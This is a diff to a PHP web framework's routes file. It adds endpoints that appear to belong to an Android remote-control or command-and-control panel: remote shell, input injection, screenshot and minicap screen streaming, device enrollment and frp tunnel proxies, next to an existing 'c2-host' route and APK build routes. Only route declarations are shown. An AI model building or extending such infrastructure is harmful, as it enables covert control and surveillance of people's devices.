@@ -31,5 +31,18 @@ Route::get('api/apk/build-logs', 'ApkController/apkBuildLogs');
 Route::get('api/apk/build-history', 'ApkController/apkBuildHistory');
 Route::get('api/system/c2-host', 'ApkController/c2Host');
 
+Route::rule('api/tunnel/config', 'TunnelController/config', 'GET|POST|OPTIONS');
+Route::get('api/tunnel/status', 'TunnelController/status');
+Route::rule('api/tunnel/deploy', 'TunnelController/deployed', 'GET|POST|OPTIONS');
+Route::post('api/tunnel/shell', 'TunnelController/shell');
+Route::post('api/tunnel/input', 'TunnelController/input');
+Route::get('api/tunnel/screenshot', 'TunnelController/screenshot');
+Route::get('api/tunnel/minicap-stream', 'TunnelController/minicapStream');
+Route::get('api/tunnel/bootstrap', 'TunnelController/bootstrap');
+Route::rule('api/tunnel/setDeviceId', 'TunnelController/setDeviceId', 'GET|POST|OPTIONS');
+Route::get('api/tunnel/tunnel-status', 'TunnelController/tunnelStatus');
+Route::post('api/tunnel/close-frps-proxy', 'TunnelController/closeFrpsProxy');
+Route::rule('api/tunnel/blacklist', 'TunnelController/blacklist', 'GET|DELETE|OPTIONS');
+
 Route::rule('m', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS');
 Route::rule('m/:any', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS')->pattern(['any' => '.*']);
